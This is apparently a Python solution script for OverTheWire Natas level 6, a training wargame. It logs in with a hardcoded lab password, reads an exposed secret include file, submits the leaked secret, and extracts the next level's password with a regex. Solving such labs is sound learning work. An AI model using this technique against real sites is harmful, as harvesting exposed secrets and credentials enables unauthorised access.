#!/usr/bin/env python

import requests
import re

user = 'natas6'
passw = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'  # from previous level
url = 'http://%s.natas.labs.overthewire.org' % user


# 1st step:  print the sourcecode
'''
r = requests.get(url, auth=(user, passw))
print(r.text)
'''


# 2nd step:  reach the index-source.html
'''
url = url + '/index-source.html'
r = requests.get(url, auth=(user, passw))
print(r.text)
'''


# 3rd step:  figuring out there is a secret.inc file
'''
url2 = url + '/includes/secret.inc'
r = requests.get(url2, auth=(user, passw))
print(r.text)
'''


# 4th step:  getting the password
r = requests.post(url, auth=(user, passw), data= {"secret": "FOEIUWGHFEEUHOFUOIU", "submit":"submit"})
webPage = r.text
matchObject = re.search('((?!%s)[a-zA-Z0-9]{32})' % passw, webPage)  # we know that the password has length of 32 chars and consisting of alphanum
# the first part of the regular expression is for not to match with our previous password, since it's also present in the sourcecode
print(matchObject.group())